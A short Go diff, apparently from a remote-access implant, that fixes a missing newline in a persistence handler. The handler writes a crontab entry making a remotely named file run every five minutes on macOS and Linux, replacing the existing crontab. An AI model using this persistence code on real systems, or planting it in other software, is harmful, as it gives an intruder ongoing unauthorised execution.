@@ -536,14 +536,14 @@ func persistHandler(data []byte, resp RPCResponse) {
 	//{{if eq .GOOS "darwin"}}
 	cmd := exec.Command("crontab")
 	stdin, _ := cmd.StdinPipe()
-	io.WriteString(stdin, "*/5 * * * * "+persistReq.Filename)
+	io.WriteString(stdin, "*/5 * * * * "+persistReq.Filename+"\n")
 	stdin.Close()
 	cmd.Start()
 	cmd.Wait()
 	//{{else if eq .GOOS "linux"}}
 	cmd := exec.Command("crontab")
 	stdin, _ := cmd.StdinPipe()
-	io.WriteString(stdin, "*/5 * * * * "+persistReq.Filename)
+	io.WriteString(stdin, "*/5 * * * * "+persistReq.Filename+"\n")
 	stdin.Close()
 	cmd.Start()
 	cmd.Wait()
